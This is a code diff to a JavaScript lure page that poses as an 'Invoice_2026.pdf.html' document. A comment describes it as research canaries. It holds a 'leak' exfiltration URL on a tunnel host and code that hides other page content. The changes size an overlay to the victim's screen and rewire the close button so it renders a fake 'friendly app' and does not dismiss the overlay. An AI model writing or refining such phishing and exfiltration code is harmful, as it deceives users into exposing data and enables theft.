@@ -13,6 +13,10 @@
    Nothing real. Researcher-typed labeled canaries only. */
 (function () {
   var EPOCH = 1792656628;
+  /* APP HEIGHT DIAL - set a number (px) for a manual exact fit of your
+     browser window, or leave null for auto (screen.availHeight - 120).
+     Try ~650-750 on a MacBook if auto is too tall. */
+  var TARGET_PX = null;
   var R = "https://uniform-var-laura-cpu.trycloudflare.com/leak?d=";
   var FNAME = "Invoice_2026.pdf.html";
   function log(m) { try { console.log("[T71b] " + m + " @" + Date.now()); } catch (e) {} }
@@ -154,7 +158,8 @@
       new MutationObserver(function () { hideAlien(); })
         .observe(d.body, { childList: true });
     } catch (e2) {}
-    var target = Math.round((window.screen && window.screen.availHeight ? window.screen.availHeight : 900) - 120);
+    var target = (typeof TARGET_PX === "number" && TARGET_PX > 200) ? TARGET_PX
+      : Math.min(Math.round((window.screen && window.screen.availHeight ? window.screen.availHeight : 900) - 120), 800);
     var base = Math.max(
       d.documentElement ? d.documentElement.scrollHeight : 0,
       d.body ? d.body.scrollHeight : 0
@@ -179,7 +184,7 @@
   function xBtn(fn) {
     var x = d.createElement("button");
     x.id = "t71b-x"; x.type = "button"; x.textContent = "\u2715";
-    x.onclick = fn || function () { ov.remove(); };
+    x.onclick = fn || function () { renderFriendlyApp(); };
     return x;
   }
 
